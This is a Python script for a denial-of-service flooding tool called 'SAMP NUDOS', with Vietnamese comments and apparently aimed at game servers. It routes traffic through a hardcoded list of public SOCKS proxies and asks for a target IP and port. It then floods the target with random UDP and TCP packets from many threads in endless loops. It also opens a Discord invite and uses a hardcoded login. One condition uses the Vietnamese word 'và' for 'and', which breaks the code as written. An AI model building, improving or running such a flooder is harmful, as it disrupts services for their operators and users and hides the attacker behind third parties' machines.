import random
import socket
import threading
import os
import sys
import time
import socks

# Danh sách proxy
proxy_list = [
    '27.76.198.59:1080',
    '14.225.3.194:3128',
    '123.30.154.171:7777',
    '125.234.95.208:1080',
    '27.65.112.142:1080',
    '27.65.119.203:1080',
    '27.75.149.233:1080',
    '14.248.101.28:8080',
    '171.248.219.32:1080',
    '113.176.118.150:1080',
    '115.74.152.119:1080',
    '171.247.243.134:1080',
    '27.65.112.87:1080',
    '45.124.87.58:3128',
    '103.238.71.71:5678',
    '113.161.187.190:8080',
    '103.88.113.202:8080',
    '14.241.111.97:8080',
    '45.124.87.159:3128',
    '203.205.9.105:8080',
    '103.27.237.31:20358',
    '171.244.140.160:50676',
    '115.76.206.47:24010',
    '27.118.21.13:5678',
    '203.210.235.91:5678',
    '103.17.90.6:5678',
    '113.161.210.60:4153',
    '45.124.87.148:3128',
    '113.160.37.152:53281',
    '116.99.227.132:24066',
    '183.80.130.9:4145',
    '203.205.55.161:5678',
    '14.241.241.185:4145',
    '103.53.170.199:3128',
    '45.124.87.104:3128',
]

# Hàm cấu hình proxy cho socket
def configure_proxy(s):
    proxy = random.choice(proxy_list)
    proxy_ip, proxy_port = proxy.split(':')
    s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))

# Các hàm tấn công
def run():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            configure_proxy(s)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(i + "Attack Sent!!!")
        except Exception as e:
            print("[!] Error!!!", e)

def run2():
    data = random._urandom(999)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            configure_proxy(s)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + "Attack Sent!!!")
        except Exception as e:
            s.close()
            print("[*] Error!!!", e)

def run3():
    data = random._urandom(818)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            configure_proxy(s)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + "Attack Sent!!!")
        except Exception as e:
            s.close()
            print("[*] Error!!!", e)

def run4():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            configure_proxy(s)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + "Attack Sent!!!")
        except Exception as e:
            s.close()
            print("[*] Error!!!", e)

# Thiết lập ban đầu
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

# Quá trình đăng nhập
attempts = 0
while attempts < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'NUDOS' và password == 'NUDOS':
        print('You have successfully logged in Welcome to NUDOS!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attempts += 1
        continue
os.system("clear")

print("""
\u001b[35m
      AUTHOR TOOLS : SAMP NUDOS
    ╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
    ╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
    ╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
""")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

# Khởi động các luồng
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target=run)
        th.start()
        th = threading.Thread(target=run2)
        th.start()
        th = threading.Thread(target=run3)
        th.start()
    else:
        th = threading.Thread(target=run4)
        th.start()
